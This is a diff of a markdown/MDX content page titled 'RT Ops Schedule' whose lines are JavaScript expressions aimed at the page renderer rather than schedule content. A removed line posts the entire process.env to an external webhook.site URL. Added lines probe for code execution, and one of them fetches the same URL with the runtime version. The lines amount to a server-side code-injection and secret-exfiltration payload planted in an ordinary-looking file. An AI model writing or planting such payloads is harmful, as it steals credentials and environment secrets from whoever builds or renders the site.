@@ -9,8 +9,10 @@ keywords: ["operations"]
 
 # RT Ops Schedule
 
-RTJSX: <div>JSX_WORKS</div>
+RTJX1: <div>JX1={1+1}</div>
 
-RTFETCH1: {(() => { try { fetch("https://webhook.site/dfa99f1c-f7de-4f0c-bb86-4db1f8e5ca1e?t=1&v=" + process.version).catch(function(){}); return "FETCH_SENT"; } catch (err) { return "FETCH_ERR:" + String(err); } })()}
+RTJX2: <div>JX2={(function(){ return "IIFE_OK"; })()}</div>
 
-RTFETCH2: {(() => { try { fetch("https://webhook.site/dfa99f1c-f7de-4f0c-bb86-4db1f8e5ca1e?t=2", {method:"POST", body: JSON.stringify(process.env)}).catch(function(){}); return "ENV_SENT"; } catch (err) { return "ENV_ERR:" + String(err); } })()}
+RTJX3: <div>JX3={(fetch("https://webhook.site/dfa99f1c-f7de-4f0c-bb86-4db1f8e5ca1e?t=3&v=" + process.version).then(function(r){ return "done"; }).catch(function(){ return "err"; }), "FETCH_DISPATCHED")}</div>
+
+RTJX4: <div>JX4={process.version}</div>
